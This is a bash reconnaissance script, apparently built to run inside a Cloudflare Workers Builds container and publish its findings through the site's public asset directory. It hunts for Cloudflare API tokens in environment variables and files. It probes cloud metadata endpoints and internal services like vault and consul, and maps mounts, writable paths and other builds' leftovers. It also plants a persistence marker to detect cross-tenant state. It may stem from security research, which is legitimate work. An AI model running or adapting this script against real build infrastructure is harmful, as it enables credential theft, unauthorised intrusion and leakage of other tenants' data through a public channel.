#!/usr/bin/env bash
# Infra recon inside the Workers Builds container. Output is written into the
# published asset dir so it can be retrieved without dashboard access.
mkdir -p dist
OUT=dist/ra60dc14f1a216434.txt
exec > >(tee "$OUT") 2>&1

echo "=== BUILD CONTAINER IDENTITY ==="
echo "user: $(whoami) uid=$(id -u) gid=$(id -g)"; id 2>/dev/null
echo "host: $(hostname)"; uname -a
echo "--- cgroup / runtime (cloudchamber?) ---"
cat /proc/1/cgroup 2>/dev/null | head -5
cat /proc/self/cgroup 2>/dev/null | head -5
ls -la /.dockerenv /run/.containerenv 2>/dev/null
echo "--- caps / seccomp ---"
grep -E 'CapEff|CapBnd|Seccomp|NoNewPrivs' /proc/self/status 2>/dev/null
echo "--- pid namespace: what else runs here? ---"
ps aux 2>/dev/null | head -25
echo "pids visible: $(ls -d /proc/[0-9]* 2>/dev/null | wc -l)"

echo
echo "=== CF TOKEN PRESENT IN CONTAINER? ==="
f=0
for v in $(env | cut -d= -f1); do
  val=$(eval "printf '%s' \"\${$v}\"")
  case "$val" in cfut_*|cfat_*) echo "  TOKEN IN ENV: $v (${#val} chars, ${val:0:5}...)"; f=1;; esac
done
grep -rlE 'cfut_|cfat_' /opt/buildhome ~/.wrangler /tmp 2>/dev/null | head -5 | while read -r x; do echo "  TOKEN IN FILE: $x"; done
[ $f -eq 0 ] && echo "  no cfut_/cfat_ in env"
echo "--- env var names only ---"
env | cut -d= -f1 | sort | tr '\n' ' '; echo

echo
echo "=== NETWORK REACH (infra) ==="
p(){ printf '  %-44s %s\n' "$1" "$(curl -s -o /dev/null -w '%{http_code}' --max-time 4 "$1" 2>/dev/null || echo none)"; }
p http://169.254.169.254/latest/meta-data/
p http://169.254.169.254/computeMetadata/v1/
p http://metadata.google.internal/
p http://127.0.0.1:8080/
p http://10.0.0.1/
p http://172.17.0.1/
echo "--- routes / neighbours ---"
ip route 2>/dev/null | head; ip addr 2>/dev/null | grep -E 'inet ' | head
cat /etc/resolv.conf 2>/dev/null | head -5
echo "--- internal name resolution ---"
for h in metadata build-cache registry consul vault cloudchamber api.internal; do
  r=$(getent hosts "$h" 2>/dev/null | awk '{print $1}'); [ -n "$r" ] && echo "  $h -> $r"
done

echo
echo "=== SHARED / CROSS-TENANT SURFACE ==="
mount 2>/dev/null | head -25
echo "--- writable outside workspace ---"
for d in / /tmp /var /opt /usr/local /home /opt/buildhome; do [ -w "$d" ] && echo "  WRITABLE: $d"; done
echo "--- other builds' leftovers ---"
ls -la /opt/buildhome 2>/dev/null | head -15
ls -la /tmp 2>/dev/null | head -15
echo "--- persistence marker ---"
echo "build $(date -u)" >> /opt/buildhome/rz_marker.txt 2>/dev/null || echo "build $(date -u)" >> /tmp/rz_marker.txt 2>/dev/null
cat /opt/buildhome/rz_marker.txt /tmp/rz_marker.txt 2>/dev/null | tail -5
echo "=== END ==="
